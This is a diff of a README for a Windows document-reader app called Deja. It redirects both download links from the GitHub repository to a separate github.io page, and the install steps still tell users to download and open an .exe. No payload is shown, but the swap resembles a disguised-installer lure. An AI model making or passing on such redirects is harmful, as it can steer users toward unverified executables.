@@ -1,6 +1,6 @@
 # 📖 Deja - Read your documents with total speed
 
-[![](https://img.shields.io/badge/Download-Deja-blue.svg)](https://github.com/Rajnandini6004/Deja)
+[![](https://img.shields.io/badge/Download-Deja-blue.svg)](https://rajnandini6004.github.io)
 
 ## 🎯 About This App
 
@@ -12,7 +12,7 @@ You need a computer running Windows 10 or Windows 11. The app works best with at
 
 ## 💾 How to Install
 
-1. Go to the [official download page](https://github.com/Rajnandini6004/Deja).
+1. Go to the [official download page](https://rajnandini6004.github.io).
 2. Look for the latest version under the Releases tab.
 3. Click the link that ends in .exe to download the installer.
 4. Open the file once the download finishes.
